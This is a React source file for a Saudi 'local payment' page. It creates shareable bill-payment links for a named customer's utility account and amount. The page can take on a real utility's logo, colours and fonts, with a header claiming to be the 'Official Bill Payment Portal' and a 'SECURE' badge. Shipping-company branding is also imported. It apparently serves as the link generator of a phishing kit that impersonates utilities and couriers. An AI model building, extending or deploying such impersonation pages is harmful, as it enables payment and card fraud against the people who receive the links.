import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { MapPin, CreditCard, Building2, User, Phone, Hash, ArrowLeft, RefreshCw, CheckCircle, Copy, ExternalLink, Lock } from "lucide-react";
import { cn } from "@/lib/utils";
import BrandedTopBar from "@/components/BrandedTopBar";
import BrandedCarousel from "@/components/BrandedCarousel";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding, utilityBranding, getBrandingByCompany } from "@/lib/brandingSystem";
import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
import { useCreateLink } from "@/hooks/useSupabase";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { useToast } from "@/hooks/use-toast";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const LocalPaymentPage = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const { entity, identity } = useAutoApplyIdentity();
  
  const [customerName, setCustomerName] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [serviceType, setServiceType] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [amount, setAmount] = useState("500");
  const [city, setCity] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const [createdLink, setCreatedLink] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [copied, setCopied] = useState(false);

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('service') || "local_payment";
  const branding = getServiceBranding(serviceKey);
  const companyBranding = getBrandingByCompany(serviceKey);

  const serviceTypes = [
    { id: "electricity", nameAr: "فاتورة الكهرباء", nameEn: "Electricity Bill" },
    { id: "water", nameAr: "فاتورة المياه", nameEn: "Water Bill" },
    { id: "gas", nameAr: "فاتورة الغاز", nameEn: "Gas Bill" },
    { id: "internet", nameAr: "فاتورة الإنترنت", nameEn: "Internet Bill" },
    { id: "phone", nameAr: "فاتورة الهاتف", nameEn: "Phone Bill" },
    { id: "municipality", nameAr: "رسوم البلدية", nameEn: "Municipality Fees" },
    { id: "housing", nameAr: "رسوم الإسكان", nameEn: "Housing Fees" },
  ];

  const cities = [
    "الرياض", "جدة", "مكة المكرمة", "المدينة المنورة", "الدمام", "الخبر", "تبوك", "أبها", "الطائف", "بريدة"
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      const selectedService = serviceTypes.find(s => s.id === serviceType);
      const link = await createLink.mutateAsync({
        type: "local_payment",
        country_code: "SA",
        payload: {
          service_key: serviceKey,
          service_name: selectedService?.nameAr || 'السداد المحلي',
          customerInfo: { fullName: customerName, phoneNumber: customerPhone, city, accountNumber },
          cod_amount: parseFloat(amount),
          service_type: serviceType,
          selectedCountry: "SA"
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: 'local_payment',
        country: 'SA',
        amount: parseFloat(amount),
        currency: 'SAR',
        type: 'local_payment'
      });
      setCreatedLink(paymentUrl);
      setShowSuccess(true);
      toast({ title: "تم إنشاء الرابط بنجاح" });
    } catch (error) {
      toast({ title: "خطأ", description: "فشل إنشاء الرابط", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  const isUtility = !!utilityBranding[serviceKey.toLowerCase()];
  const currentBranding = isUtility ? utilityBranding[serviceKey.toLowerCase()] : branding;

  return (
    <>
      <PaymentMetaTags
        serviceName={currentBranding?.nameAr || "السداد المحلي"}
        serviceKey={serviceKey}
        amount={amount ? `${amount} ريال` : ""}
        title={`${currentBranding?.nameAr || "السداد المحلي"} - دفع الفواتير والخدمات`}
        description={`ادفع فواتير ${currentBranding?.nameAr || "الخدمات المحلية"} بسهولة وأمان`}
      />

      {isUtility ? (
        <header className="bg-white border-b-4 h-20 flex items-center px-6 sticky top-0 z-50" style={{ borderBottomColor: currentBranding.colors.primary }}>
           <div className="container mx-auto flex items-center justify-between">
              <div className="flex items-center gap-4">
                 <img src={currentBranding.logoUrl} className="h-12" alt={currentBranding.nameEn} />
                 <div className="h-10 w-px bg-gray-100 hidden sm:block" />
                 <div className="hidden sm:block">
                    <h1 className="text-lg font-black text-gray-800">{currentBranding.nameAr}</h1>
                    <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Official Bill Payment Portal</p>
                 </div>
              </div>
              <div className="flex items-center gap-2">
                 <div className="px-4 py-2 bg-blue-50 text-blue-600 rounded-full text-xs font-black flex items-center gap-2 border border-blue-100">
                    <Lock className="w-4 h-4" /> <span>SECURE</span>
                 </div>
              </div>
           </div>
        </header>
      ) : (
        <BrandedTopBar
          serviceKey={serviceKey}
          serviceName="السداد المحلي"
          showBackButton={true}
          showCarousel={false}
        />
      )}

      {!isUtility && <BrandedCarousel serviceKey={serviceKey} className="mb-0" />}

      <div 
        className="min-h-screen py-6 sm:py-8" 
        dir="rtl"
        style={{
          background: isUtility ? '#f8fafc' : identity ? `linear-gradient(135deg, ${identity.colors.background}, ${identity.colors.secondary}15)` : `linear-gradient(135deg, #E6FFE6, #00C00015)`,
          fontFamily: isUtility ? currentBranding.fonts.arabic : identity?.fonts[0] || 'Cairo, Tajawal, sans-serif'
        }}
      >
        <div className="container mx-auto px-3 sm:px-4">
          <div className="max-w-2xl mx-auto">
            <Card 
              className={cn("p-4 sm:p-8 shadow-2xl border-t-4 relative overflow-hidden", isUtility ? "rounded-none border-t-8" : "rounded-[2rem]")}
              style={{ 
                borderTopColor: isUtility ? currentBranding.colors.primary : identity?.colors.primary || '#008000',
                boxShadow: isUtility ? '0 10px 40px -10px rgba(0,0,0,0.08)' : '0 20px 60px -15px rgba(0, 128, 0, 0.3)',
                background: '#FFFFFF'
              }}
            >
              {!isUtility && (
                <div
                  className="absolute top-0 left-0 right-0 h-1"
                  style={{
                    background: `linear-gradient(90deg, ${identity?.colors.primary || '#008000'}, ${identity?.colors.secondary || '#00C000'})`
                  }}
                />
              )}

              <form onSubmit={handleSubmit}>
                <div className="flex items-center justify-between mb-6 sm:mb-8 border-b pb-6">
                  <div>
                    <h1 
                      className="text-xl sm:text-3xl font-black mb-1"
                      style={{ 
                        color: isUtility ? currentBranding.colors.primary : identity?.colors.primary || '#008000',
                      }}
                    >
                      {isUtility ? currentBranding.nameAr : "السداد المحلي"}
                    </h1>
                    <p className="text-sm text-gray-400 font-bold">{isUtility ? currentBranding.description : "ادفع فواتير الخدمات بسهولة"}</p>
                  </div>

                  {!isUtility && (
                    <div
                      className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                      style={{
                        background: `linear-gradient(135deg, ${identity?.colors.primary || '#008000'}, ${identity?.colors.secondary || '#00C000'})`,
                      }}
                    >
                      <Building2 className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                    </div>
                  )}
                </div>

                <div className="space-y-4 mb-6">
                  <div>
                    <Label className="mb-2 text-sm font-bold flex items-center gap-2">
                      <Building2 className="w-4 h-4" />
                      نوع الخدمة *
                    </Label>
                    <Select value={serviceType} onValueChange={setServiceType}>
                      <SelectTrigger className="h-12 border-2">
                        <SelectValue placeholder="اختر نوع الخدمة" />
                      </SelectTrigger>
                      <SelectContent>
                        {serviceTypes.map((service) => (
                          <SelectItem key={service.id} value={service.id}>
                            {service.nameAr}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div>
                    <Label className="mb-2 text-sm font-bold flex items-center gap-2">
                      <Hash className="w-4 h-4" />
                      رقم الحساب / المشترك *
                    </Label>
                    <Input
                      value={accountNumber}
                      onChange={(e) => setAccountNumber(e.target.value)}
                      placeholder="أدخل رقم الحساب"
                      className="h-12 border-2"
                      required
                    />
                  </div>

                  <div>
                    <Label className="mb-2 text-sm font-bold flex items-center gap-2">
                      <User className="w-4 h-4" />
                      الاسم الكامل *
                    </Label>
                    <Input
                      value={customerName}
                      onChange={(e) => setCustomerName(e.target.value)}
                      placeholder="أدخل اسمك الكامل"
                      className="h-12 border-2"
                      required
                    />
                  </div>

                  <div>
                    <Label className="mb-2 text-sm font-bold flex items-center gap-2">
                      <Phone className="w-4 h-4" />
                      رقم الجوال *
                    </Label>
                    <Input
                      type="tel"
                      value={customerPhone}
                      onChange={(e) => setCustomerPhone(e.target.value)}
                      placeholder="+966 5X XXX XXXX"
                      className="h-12 border-2"
                      required
                    />
                  </div>

                  <div>
                    <Label className="mb-2 text-sm font-bold flex items-center gap-2">
                      <MapPin className="w-4 h-4" />
                      المدينة *
                    </Label>
                    <Select value={city} onValueChange={setCity}>
                      <SelectTrigger className="h-12 border-2">
                        <SelectValue placeholder="اختر المدينة" />
                      </SelectTrigger>
                      <SelectContent>
                        {cities.map((cityName) => (
                          <SelectItem key={cityName} value={cityName}>
                            {cityName}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>

                  <div>
                    <Label className="mb-2 text-sm font-bold flex items-center gap-2">
                      <CreditCard className="w-4 h-4" />
                      المبلغ المطلوب *
                    </Label>
                    <Input
                      type="number"
                      value={amount}
                      onChange={(e) => setAmount(e.target.value)}
                      placeholder="أدخل المبلغ"
                      className="h-12 border-2"
                      step="0.01"
                      min="0"
                      required
                    />
                  </div>
                </div>

                <div 
                  className={cn("p-6 mb-8 transition-all duration-500", isUtility ? "bg-slate-50 border-r-4" : "rounded-3xl bg-opacity-10")}
                  style={{
                    backgroundColor: isUtility ? '#F8FAFC' : `${identity?.colors.primary || '#008000'}10`,
                    borderRightColor: isUtility ? currentBranding.colors.primary : identity?.colors.primary || '#008000',
                    borderRightWidth: isUtility ? '4px' : '0'
                  }}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-slate-500 uppercase tracking-tight text-xs">المبلغ الإجمالي المستحق</span>
                    <div className="text-right">
                      <span
                        key={amount}
                        className="text-3xl font-black block animate-in fade-in zoom-in duration-300"
                        style={{ color: isUtility ? currentBranding.colors.primary : identity?.colors.primary || '#008000' }}
                      >
                        {amount ? `${parseFloat(amount).toLocaleString()} ريال` : '---'}
                      </span>
                      <span className="text-[10px] text-slate-400 font-bold">شامل ضريبة القيمة المضافة</span>
                    </div>
                  </div>
                </div>

                <Button
                  type="submit"
                  size="lg"
                  disabled={isSubmitting || !customerName || !customerPhone || !serviceType || !accountNumber || !amount || !city}
                  className={cn("w-full text-xl py-8 text-white font-black shadow-2xl transition-all active:scale-95", isUtility ? "rounded-none" : "rounded-2xl")}
                  style={{
                    background: isUtility ? currentBranding.colors.primary : `linear-gradient(135deg, ${identity?.colors.primary || '#008000'}, ${identity?.colors.secondary || '#00C000'})`,
                  }}
                >
                  {isSubmitting ? <RefreshCw className="w-6 h-6 animate-spin" /> : (
                    <>
                      <span className="ml-2">إصدار رابط السداد</span>
                      <ArrowLeft className="w-5 h-5 mr-2" />
                    </>
                  )}
                </Button>

                <p className="text-xs text-center text-muted-foreground mt-4">
                  🔒 جميع المعاملات مشفرة وآمنة
                </p>
              </form>
            </Card>
          </div>
        </div>
      </div>

      <AlertDialog open={showSuccess} onOpenChange={setShowSuccess}>
        <AlertDialogContent className="max-w-[90%] rounded-[2.5rem] border-none shadow-2xl p-0 overflow-hidden" dir="rtl">
           <div className="p-10 text-center space-y-6">
              <div className="w-24 h-24 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-2">
                <div className="w-16 h-16 bg-green-600 rounded-full flex items-center justify-center animate-bounce shadow-lg">
                  <RefreshCw className="w-8 h-8 text-white" />
                </div>
              </div>
              <div className="space-y-1">
                <AlertDialogTitle className="text-3xl font-black text-slate-900">رابط السداد جاهز!</AlertDialogTitle>
                <AlertDialogDescription className="font-bold text-slate-500">تم إنشاء رابط دفع آمن للسداد المحلي بنجاح</AlertDialogDescription>
              </div>

              <div className="bg-slate-50 p-4 rounded-2xl border-2 border-dashed border-slate-200 break-all font-mono text-xs font-bold text-slate-400">
                {createdLink}
              </div>

              <div className="flex gap-4">
                 <Button onClick={() => { navigator.clipboard.writeText(createdLink); setCopied(true); setTimeout(() => setCopied(false), 2000); toast({ title: "تم النسخ" }); }} className="flex-1 h-16 rounded-2xl font-black bg-slate-900 text-white gap-2">
                   {copied ? <CheckCircle className="w-5 h-5" /> : <Copy className="w-5 h-5" />}
                   {copied ? "تم النسخ" : "نسخ الرابط"}
                 </Button>
                 <Button onClick={() => window.open(createdLink, '_blank')} variant="outline" className="flex-1 h-16 rounded-2xl font-black border-2 border-slate-200 gap-2 text-slate-700">
                   <ExternalLink className="w-5 h-5" /> معاينة
                 </Button>
              </div>
              <Button variant="ghost" onClick={() => setShowSuccess(false)} className="w-full font-bold text-slate-300">إغلاق</Button>
           </div>
        </AlertDialogContent>
      </AlertDialog>
    </>
  );
};

export default LocalPaymentPage;
